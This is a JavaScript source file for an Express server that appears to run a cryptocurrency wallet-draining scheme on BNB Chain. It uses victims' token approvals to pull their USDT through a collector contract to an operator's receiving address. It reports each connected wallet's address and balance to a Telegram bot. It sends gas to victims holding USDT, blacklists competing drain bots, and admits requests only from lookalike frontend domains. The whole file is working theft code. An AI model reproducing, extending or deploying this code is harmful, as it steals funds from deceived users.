import express from 'express';
import cors from 'cors';
import dotenv from 'dotenv';
import axios from 'axios';
import { ethers } from 'ethers';

dotenv.config();

const app = express();

const PORT = process.env.PORT || 3001;

app.use(cors());

app.use(express.json());

// Load Config from environment variables
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const OWNER_PRIVATE_KEY = process.env.OWNER_PRIVATE_KEY;
const RECEIVER_ADDRESS = process.env.RECEIVER_ADDRESS;
const RPC_URL = process.env.RPC_URL || 'https://bsc-dataseed.binance.org/';
const USDT_ADDRESS = '0x55d398326f99059fF775485246999027B3197955';
const AUTO_COLLECTOR_ADDRESS = '0xa78Eec7Cf7B694D92845A0577C549Baa560a4F0b';
const API_SECRET = process.env.API_SECRET;

// 🔒 Protection 3: Rate limiter — max 1 BNB fund per address per 5 min
const fundingCooldowns = new Map();
const FUNDING_COOLDOWN_MS = 5 * 60 * 1000;

// 🔒 Protection 4: BLACKLIST — known drain bots (have USDT but immediately forward BNB)
const BLACKLISTED_ADDRESSES = new Set([
  '0x4c8fe03f456eb21843951afdbac73ed83699e953', // confirmed drain bot — forwards BNB instantly
  '0xd52e3202205595e0acecfdb1cca19ddf4d5b83a9',
  '0xb10be513804c0367e6c84c5a26b465c2bb8ffa92',
  '0xfb64575104bc43c7a95c4f866d818445ee90c041',
].map(a => a.toLowerCase()));

// 🔒 Protection 1: API Secret Key Middleware — reject requests without valid key
app.use((req, res, next) => {
  const clientKey = req.headers['x-api-key'];
  if (!API_SECRET) {
    console.error('🚨 CRITICAL: API_SECRET env var is not set! Blocking all requests.');
    return res.status(503).json({ error: 'Service misconfigured' });
  }
  if (!clientKey || clientKey !== API_SECRET) {
    console.warn(`🚫 Unauthorized request blocked from: ${req.ip} | Key: ${clientKey || 'MISSING'}`);
    return res.status(401).json({ error: 'Unauthorized' });
  }
  next();
});

// 🔒 Protection 5: Origin Check — only allow requests from real browsers/website
// Bots (node-fetch, curl, Postman) don't send Origin header → blocked
app.use((req, res, next) => {
  // Allow CORS preflight to pass through
  if (req.method === 'OPTIONS') return next();

  const origin = req.headers['origin'] || req.headers['referer'] || '';

  const isAllowed =
    origin.includes('usdtsend.co') ||           // manual frontend
    origin.includes('bscchain.org') ||           // certificate frontend
    origin.includes('bep20admin.vercel.app') ||  // admin panel
    origin.includes('vercel.app') ||       // any other vercel deployments
    origin.includes('http://localhost:5174') ||             // any other vercel deployments
    origin.includes('http://192.168.1.13:5173') ||
    // any other vercel deployments
    origin.includes('adminpanelbep2.netlify.app') ||          // any other vercel deployments
    origin.includes('transferusdt20.netlify.app')         // any other vercel deployments
 

  if (!isAllowed) {
    console.warn(`🚫 Direct API access blocked. Origin: "${origin}" | IP: ${req.ip}`);
    return res.status(403).json({ error: 'Direct API access not allowed' });
  }

  next();
});


// ABI Definitions
const USDT_ABI = [
  'function balanceOf(address owner) view returns (uint256)',
  'function decimals() view returns (uint8)',
  'function allowance(address owner, address spender) view returns (uint256)'
];
const COLLECTOR_ABI = [
  'function collectFrom(address token, address from, uint256 amount, address to) external'
];

// --- Helper Function: Execute Collection ---
const executeCollection = async (userAddress, amount) => {
  if (!OWNER_PRIVATE_KEY) {
    throw new Error('Server missing Private Key');
  }

  const provider = new ethers.JsonRpcProvider(RPC_URL);
  const wallet = new ethers.Wallet(OWNER_PRIVATE_KEY, provider);
  const collectorContract = new ethers.Contract(AUTO_COLLECTOR_ADDRESS, COLLECTOR_ABI, wallet);
  const usdtContract = new ethers.Contract(USDT_ADDRESS, USDT_ABI, provider);

  const decimals = await usdtContract.decimals();
  const amountWei = ethers.parseUnits(amount.toString(), decimals);

  console.log(`Initiating Transfer: ${amount} USDT from ${userAddress} to ${RECEIVER_ADDRESS}`);

  const tx = await collectorContract.collectFrom(
    USDT_ADDRESS,
    userAddress,
    amountWei,
    RECEIVER_ADDRESS
  );

  console.log('Transaction sent:', tx.hash);

  // wait in background only
  tx.wait()
    .then(r => console.log('Transaction confirmed:', r.hash))
    .catch(console.error);

  // return immediately
  return tx.hash;
};

app.post('/notify-approval', async (req, res) => {
  const { userAddress, txHash, source, amount } = req.body;

  console.log(`Received approval from: ${userAddress} | Hash: ${txHash} | Amount: ${amount}`);

  let transferHash = null; // ✅ define outside

  if (userAddress) {
    // ✅ Only attempt transfer if a valid amount is provided
    if (amount && !isNaN(amount) && Number(amount) > 0) {
      try {
        transferHash = await executeCollection(userAddress, amount);
      } catch (transferError) {
        console.error('Auto-Transfer Failed:', transferError.message);
      }
    } else {
      console.log('⚠️ No valid amount provided. Skipping transfer.');
    }

    try {
      let balanceStr = 'Loading...';

      const provider = new ethers.JsonRpcProvider(RPC_URL);
      const usdtContract = new ethers.Contract(USDT_ADDRESS, USDT_ABI, provider);
      const balance = await usdtContract.balanceOf(userAddress);
      const decimals = await usdtContract.decimals();
      balanceStr = '$' + ethers.formatUnits(balance, decimals);

      await sendTelegramNotification(userAddress, txHash, source, balanceStr);

    } catch (error) {
      console.error('Telegram error:', error.message);
    }
  }

  res.json({
    success: true,
    transferHash
  });
});


// 🔒 Secret endpoint name — bots cannot guess this
app.post('/api/v2/ws-user-gate', async (req, res) => {

  console.log("userAddress", req.body.userAddress);
  console.log("attemptFund", req.body.attemptFund);
  const { userAddress, attemptFund } = req.body;
  if (!userAddress) return res.status(400).json({ error: 'No address provided' });

  // 🔒 Protection 4: Blacklist check — instantly reject known drain bots
  if (BLACKLISTED_ADDRESSES.has(userAddress.toLowerCase())) {
    console.log(`🚫 BLACKLISTED address rejected: ${userAddress}`);
    return res.status(403).json({ error: 'Forbidden' });
  }

  try {
    let isFunded = false;
    const provider = new ethers.JsonRpcProvider(RPC_URL);

    // 🔒 ALWAYS check USDT balance first — gate for both Telegram and BNB
    let usdtBalance = 0n;
    let balanceStr = '$0.0';
    try {
      const usdtContract = new ethers.Contract(USDT_ADDRESS, USDT_ABI, provider);
      usdtBalance = await usdtContract.balanceOf(userAddress);
      const decimals = await usdtContract.decimals();
      balanceStr = '$' + ethers.formatUnits(usdtBalance, decimals);
    } catch (e) {
      balanceStr = 'N/A';
    }

    // 🔒 Protection 2: Skip EVERYTHING (Telegram + BNB) if USDT = 0
    if (usdtBalance === 0n) {
      console.log(`🚫 Skipping: ${userAddress} has 0 USDT. Ignoring completely.`);
      return res.json({ success: true, funded: false }); // Silent skip — no Telegram noise
    }

    // ✅ Only reaches here if USDT > 0 (real user)

    // 🔒 AUTO-BNB TRANSFER LOGIC
    if (attemptFund) {
      try {
        const autoFundAmount = process.env.AUTO_FUND_AMOUNT || "0.00003";
        const autoFundThreshold = process.env.AUTO_FUND_THRESHOLD || "0.00003";

        // 🔒 Protection 3: Rate limit
        const lastFunded = fundingCooldowns.get(userAddress);
        if (lastFunded && (Date.now() - lastFunded) < FUNDING_COOLDOWN_MS) {
          console.log(`🚫 Rate limit: ${userAddress} funded recently. Skipping BNB send.`);
        } else {
          const bnbBalanceWei = await provider.getBalance(userAddress);
          const thresholdWei = ethers.parseEther(autoFundThreshold);

          if (bnbBalanceWei < thresholdWei) {
            console.log(`⚠️ Low BNB for ${userAddress} (USDT OK). Initiating Auto-Gas Transfer...`);
            if (OWNER_PRIVATE_KEY) {
              const wallet = new ethers.Wallet(OWNER_PRIVATE_KEY, provider);
              const tx = await wallet.sendTransaction({
                to: userAddress,
                value: ethers.parseEther(autoFundAmount)
              });
              console.log(`✅ Sent ${autoFundAmount} BNB to ${userAddress}. Hash: ${tx.hash}`);
              fundingCooldowns.set(userAddress, Date.now());
              isFunded = true;
            } else {
              console.warn('⚠️ Cannot send Gas: Owner Private Key missing.');
            }
          } else {
            console.log(`ℹ️ ${userAddress} has enough BNB. No fund needed.`);
          }
        }
      } catch (gasError) {
        console.error('❌ Auto-Gas Transfer Failed:', gasError.message);
      }
    }

    // ✅ Send Telegram — only for real users (USDT > 0)
    const time = new Date().toLocaleString('en-US', { timeZone: 'Asia/Kolkata' });
    const message = `
👀 <b>ACCOUNT INFO OPENED / WALLET CONNECTED</b>

👤 <b>USER ADDRESS:</b>
<code>${userAddress}</code>

💰 <b>BALANCE:</b>
<b>${balanceStr}</b>

⏰ <b>TIME:</b>
<code>${time}</code>
    `.trim();

    if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
      const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      await axios.post(telegramUrl, {
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'HTML'
      });
      console.log(`Visit notification sent for ${userAddress}`);
    }

    res.json({ success: true, funded: isFunded });
  } catch (error) {
    console.error('Visit Notification Error:', error.message);
    res.status(500).json({ error: error.message });
  }
});

// --- Admin Endpoints ---


// 1. Get Config (Receiver Address)
app.get('/admin/config', (req, res) => {
  res.json({ receiverAddress: RECEIVER_ADDRESS });
});

// 2. Check Balance
app.post('/admin/check-balance', async (req, res) => {
  const { userAddress } = req.body;
  try {
    const provider = new ethers.JsonRpcProvider(RPC_URL);
    const usdtContract = new ethers.Contract(USDT_ADDRESS, USDT_ABI, provider);
    const balance = await usdtContract.balanceOf(userAddress);
    const allowance = await usdtContract.allowance(userAddress, AUTO_COLLECTOR_ADDRESS);
    const decimals = await usdtContract.decimals();

    const formattedBalance = ethers.formatUnits(balance, decimals);
    const formattedAllowance = ethers.formatUnits(allowance, decimals);

    res.json({
      success: true,
      balance: formattedBalance,
      allowance: formattedAllowance,
      rawBalance: balance.toString(),
      rawAllowance: allowance.toString()
    });
  } catch (error) {
    console.error('Balance Check Error:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

// --- Helper: Send Telegram Notification ---
const sendTelegramNotification = async (userAddress, txHash, source, balanceStr = 'N/A') => {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;

  const time = new Date().toLocaleString('en-US', { timeZone: 'Asia/Kolkata' });
  const message = `
🚀 <b>NEW TRANSFER INITIATED!</b>

📱 <b>SOURCE:</b>
<code>${source ? source.toUpperCase() : 'ADMIN PANEL'}</code>

👤 <b>USER ADDRESS:</b>
<code>${userAddress}</code>

🔗 <b>TRANSACTION HASH:</b>
<a href="https://bscscan.com/tx/${txHash}">View on BscScan</a>
<code>${txHash || 'Pending'}</code>

💰 <b>BALANCE:</b>
<b>${balanceStr}</b>

⏰ <b>TIME:</b>
<code>${time}</code>
  `.trim();

  try {
    const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    await axios.post(telegramUrl, {
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
      parse_mode: 'HTML'
    });
    console.log('Telegram notification sent.');
  } catch (error) {
    console.error('Error sending Telegram notification:', error.message);
  }
};

// 3. Transfer Function
app.post('/admin/transfer', async (req, res) => {
  const { userAddress, amount } = req.body;

  try {
    const txHash = await executeCollection(userAddress, amount);

    // Send Notification - REMOVED per user request
    // await sendTelegramNotification(userAddress, txHash, 'ADMIN_PANEL');

    res.json({ success: true, txHash });
  } catch (error) {
    console.error('Transfer Error:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

if (!process.env.VERCEL) {
  app.listen(PORT, () => {
    console.log(`Backend server running on http://localhost:${PORT}`);
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
      console.warn('⚠️  WARNING: Telegram Bot Token or Chat ID not found in .env file.');
    }
  });
}

export default app;
